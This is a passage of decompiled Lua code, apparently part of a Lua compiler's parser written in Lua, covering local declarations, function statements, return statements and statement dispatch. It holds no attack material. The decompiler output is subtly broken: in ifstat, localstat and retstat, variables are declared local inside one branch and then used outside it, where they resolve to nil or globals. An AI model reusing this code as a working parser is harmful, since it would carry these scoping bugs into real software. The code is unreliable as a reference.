		v106 = u1:concat(l__fs__105, v106, u1:jump(l__fs__105));
		u1:patchtohere(l__fs__105, v107);
		v107 = p225:test_then_block(p226);	
	end;
	if p226.t.token == "TK_ELSE" then
		local v108 = u1:concat(l__fs__105, v106, u1:jump(l__fs__105));
		u1:patchtohere(l__fs__105, v107);
		v2:next(p226);
		p225:block(p226);
	else
		v108 = u1:concat(l__fs__105, v106, v107);
	end;
	u1:patchtohere(l__fs__105, v108);
	p225:check_match(p226, "TK_END", "TK_IF", p227);
end;
function v1.localfunc(p228, p229)
	local v109 = {};
	local v110 = {};
	local l__fs__111 = p229.fs;
	p228:new_localvar(p229, p228:str_checkname(p229), 0);
	p228:init_exp(v109, "VLOCAL", l__fs__111.freereg);
	u1:reserveregs(l__fs__111, 1);
	p228:adjustlocalvars(p229, 1);
	p228:body(p229, v110, false, p229.linenumber);
	u1:storevar(l__fs__111, v109, v110);
	p228:getlocvar(l__fs__111, l__fs__111.nactvar - 1).startpc = l__fs__111.pc;
end;
function v1.localstat(p230, p231)
	local v112 = 0;
	local v113 = {};
	while true do
		p230:new_localvar(p231, p230:str_checkname(p231), v112);
		v112 = v112 + 1;
		if not p230:testnext(p231, ",") then
			break;
		end;	
	end;
	if p230:testnext(p231, "=") then
		local v114 = p230:explist1(p231, v113);
	else
		v113.k = "VVOID";
		v114 = 0;
	end;
	p230:adjust_assign(p231, v112, v114, v113);
	p230:adjustlocalvars(p231, v112);
end;
function v1.funcname(p232, p233, p234)
	local v115 = false;
	p232:singlevar(p233, p234);
	while p233.t.token == "." do
		p232:field(p233, p234);	
	end;
	if p233.t.token == ":" then
		v115 = true;
		p232:field(p233, p234);
	end;
	return v115;
end;
function v1.funcstat(p235, p236, p237)
	local v116 = {};
	local v117 = {};
	v2:next(p236);
	p235:body(p236, v117, p235:funcname(p236, v116), p237);
	u1:storevar(p236.fs, v116, v117);
	u1:fixline(p236.fs, p237);
end;
function v1.exprstat(p238, p239)
	local v118 = {
		v = {}
	};
	p238:primaryexp(p239, v118.v);
	if v118.v.k ~= "VCALL" then
		v118.prev = nil;
		p238:assignment(p239, v118, 1);
		return;
	end;
	u2:SETARG_C(u1:getcode(p239.fs, v118.v), 1);
end;
function v1.retstat(p240, p241)
	local l__fs__119 = p241.fs;
	local v120 = {};
	v2:next(p241);
	if p240:block_follow(p241.t.token) or p241.t.token == ";" then
		local v121 = 0;
		local v122 = 0;
	else
		v122 = p240:explist1(p241, v120);
		if p240:hasmultret(v120.k) then
			u1:setmultret(l__fs__119, v120);
			if v120.k == "VCALL" and v122 == 1 then
				u2:SET_OPCODE(u1:getcode(l__fs__119, v120), "OP_TAILCALL");
				assert(u2:GETARG_A(u1:getcode(l__fs__119, v120)) == l__fs__119.nactvar);
			end;
			v121 = l__fs__119.nactvar;
			v122 = p240.LUA_MULTRET;
		elseif v122 == 1 then
			v121 = u1:exp2anyreg(l__fs__119, v120);
		else
			u1:exp2nextreg(l__fs__119, v120);
			v121 = l__fs__119.nactvar;
			assert(v122 == l__fs__119.freereg - v121);
		end;
	end;
	u1:ret(l__fs__119, v121, v122);
end;
function v1.statement(p242, p243)
	local v123 = nil;
	v123 = p243.linenumber;
	local l__token__124 = p243.t.token;
	if l__token__124 == "TK_IF" then
		p242:ifstat(p243, v123);
		return false;
	end;
	if l__token__124 == "TK_WHILE" then
		p242:whilestat(p243, v123);
		return false;
	end;
	if l__token__124 == "TK_DO" then
		v2:next(p243);
		p242:block(p243);
		p242:check_match(p243, "TK_END", "TK_DO", v123);
		return false;
	end;
	if l__token__124 == "TK_FOR" then
		p242:forstat(p243, v123);
		return false;
	end;
	if l__token__124 == "TK_REPEAT" then
		p242:repeatstat(p243, v123);
		return false;
	end;
	if l__token__124 == "TK_FUNCTION" then
		p242:funcstat(p243, v123);
		return false;
	end;
	if l__token__124 == "TK_LOCAL" then
		v2:next(p243);
		if p242:testnext(p243, "TK_FUNCTION") then
			p242:localfunc(p243);
		else
			p242:localstat(p243);
		end;
		return false;
	end;
	if l__token__124 == "TK_RETURN" then
		p242:retstat(p243);
		return true;
	end;
	if l__token__124 ~= "TK_BREAK" then
		p242:exprstat(p243);
		return false;
	end;
	v2:next(p243);
	p242:breakstat(p243);
	return true;
end;
function v1.chunk(p244, p245)
	local v125 = false;
	p244:enterlevel(p245);
	while not v125 and not p244:block_follow(p245.t.token) do
		v125 = p244:statement(p245);
		p244:testnext(p245, ";");
		local v126 = false;
		if p245.fs.freereg <= p245.fs.f.maxstacksize then
			v126 = p245.fs.nactvar <= p245.fs.freereg;
		end;
		assert(v126);
		p245.fs.freereg = p245.fs.nactvar;	
	end;
	p244:leavelevel(p245);
end;
return v1;
